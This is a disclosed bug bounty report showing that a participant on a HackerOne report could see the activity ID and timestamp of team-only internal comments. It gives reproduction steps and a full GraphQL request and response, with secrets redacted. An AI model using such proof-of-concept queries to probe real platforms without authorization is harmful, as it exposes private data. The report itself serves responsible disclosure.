# latest_activity_id and latest_activity_at may disclose information about internal activities to unauthorized users

## Report Details
- **Report ID**: 724944
- **URL**: https://hackerone.com/reports/724944
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-10-29T18:00:21.828Z
- **Disclosed**: 2019-11-10T09:54:44.167Z

## Reporter
- **Username**: egrep
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Mini information disclosure related with team's internal comments/assign group activity id and date_time are exposed

Steps:
1) As victim, Create a sandbox team and create report
2) Add attacker as a participant for the report
3) As victim, create some internal comments ( team -only comments )/assign group for the report
4) As attacker , request url "https://hackerone.com/reports/<report-id>.json" ( Eg: ███ ) to view latest_activity_id (█████)
5) As attacker, post below graphql request to view "latest_activity_at" date-time of internal discussion ( ██████ )

Request:

```
POST /graphql? HTTP/1.1
Host: hackerone.com
Connection: close
Content-Length: 123
Accept: */*
X-Auth-Token: ███
Origin: https://hackerone.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
Sec-Fetch-Mode: cors
Content-Type: application/json
Sec-Fetch-Site: same-origin
Referer: https://hackerone.com/vairaselvamvvs
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: ███

{"query":"query { node(id: \"gid://hackerone/Report/█████\") { ... on Report { _id,latest_activity_at }}}","variables":{}}
```

Response:

```
HTTP/1.1 200 OK
Date: Tue, 29 Oct 2019 17:50:48 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Cache-Control: no-cache, no-store
Content-Disposition: inline; filename="response."
X-Request-Id: eb31d77a-6b54-4bcb-8007-c90f0b19307d
Set-Cookie: ███
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Expect-CT: enforce, max-age=86400
Content-Security-Policy: default-src 'none'; base-uri 'self'; block-all-mixed-content; child-src www.youtube-nocookie.com b5s.hackerone-ext-content.com; connect-src 'self' www.google-analytics.com errors.hackerone.net; font-src 'self'; form-action 'self'; frame-ancestors 'none'; img-src 'self' data: cover-photos.hackerone-user-content.com hackathon-photos.hackerone-user-content.com profile-photos.hackerone-user-content.com hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com; media-src 'self' hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com; script-src 'self' www.google-analytics.com; style-src 'self' 'unsafe-inline'; report-uri https://errors.hackerone.net/api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block
CF-Cache-Status: DYNAMIC
Server: cloudflare
CF-RAY: 52d6fe6eed5dd5fc-BOM
Content-Length: 82

{"data":{"node":{"_id":"████████","latest_activity_at":"███████"}}}
```

## Impact

latest_activity_id and latest_activity_at related with team internal discussion exposed

## Attachments
No attachments
